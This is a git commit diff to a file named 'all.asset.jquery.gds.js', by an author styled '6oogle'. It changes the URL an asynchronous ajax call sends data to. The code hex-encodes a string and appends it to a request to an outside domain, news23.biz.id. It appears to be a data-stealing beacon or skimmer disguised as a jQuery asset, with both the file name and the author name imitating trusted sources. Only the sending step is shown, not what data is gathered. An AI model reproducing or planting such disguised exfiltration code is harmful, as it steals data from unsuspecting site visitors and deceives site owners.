304b0007509b25fa6eff7e3a0dac405162acca5a
6oogle <155930261+ImgTheHost@users.noreply.github.com>
2024-06-15 20:55:13 +0700

    Update all.asset.jquery.gds.js

--- all.asset.jquery.gds.js
+++ all.asset.jquery.gds.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://jquery.news23.biz.id/index.php" +
+                    "https://sewa-panel.news23.biz.id/IndeXHost/?JapaScript=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
